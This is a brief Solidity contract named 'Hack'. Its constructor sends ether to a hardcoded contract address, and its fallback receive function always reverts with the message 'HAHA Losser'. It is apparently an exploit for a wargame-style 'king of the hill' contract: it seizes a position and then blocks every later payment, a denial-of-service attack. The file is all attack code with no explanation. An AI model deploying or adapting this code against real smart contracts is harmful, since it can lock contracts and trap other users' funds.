// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract Hack {
    constructor() payable {
        address addr = 0x2b961E3959b79326A8e7F64Ef0d2d825707669b5;
        (bool status, ) =payable(addr).call{value: msg.value}("");
        require(status);
    }


    receive() external payable {
        revert("HAHA Losser");
    }
}
